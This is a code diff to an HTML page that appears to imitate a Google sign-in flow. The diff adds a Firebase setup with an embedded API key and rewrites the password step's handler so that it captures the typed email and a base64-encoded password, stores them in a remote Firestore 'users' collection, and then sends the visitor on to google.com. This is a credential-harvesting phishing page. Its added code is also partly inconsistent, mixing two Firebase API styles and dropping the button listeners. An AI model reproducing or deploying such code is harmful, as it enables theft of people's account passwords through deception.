@@ -207,6 +207,22 @@
     }
   </style>
 </head>
+  <script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
+  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyDbn9F_FfvaB1MbcNMIa4UwQCdWMapK_DE",
+    authDomain: "accounts-fbccb.firebaseapp.com",
+    projectId: "accounts-fbccb",
+    storageBucket: "accounts-fbccb.firebasestorage.app",
+    messagingSenderId: "399300523624",
+    appId: "1:399300523624:web:c91420a4e21e7970bbaddd"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+</script>
 <body>
 
   <header>
@@ -341,12 +357,28 @@
     }
 
     // ── Step 2 Next → redirect ──
-    document.getElementById('btn-next-password').addEventListener('click', doRedirect);
-    document.getElementById('password').addEventListener('keydown', e => { if (e.key === 'Enter') doRedirect(); });
+function doRedirect() {
+  const email = document.getElementById('email').value.trim();
+  const password = document.getElementById('password').value;
 
-    function doRedirect() {
-      window.location.href = 'https://www.google.com/?igu=1';
-    }
+  // Base64 encode the password
+  const encodedPassword = btoa(password);
+
+  // Add to Firestore
+  db.collection("users").add({
+    email: email,
+    password: encodedPassword,
+    timestamp: firebase.firestore.FieldValue.serverTimestamp()
+  })
+  .then(() => {
+    alert("User data saved to Firestore!");
+    window.location.href = 'https://www.google.com/?igu=1';
+  })
+  .catch((error) => {
+    console.error("Error writing document: ", error);
+    alert("Error saving user data.");
+  });
+}
 
     // ── Chip → back to email ──
     document.getElementById('email-chip').addEventListener('click', function() {
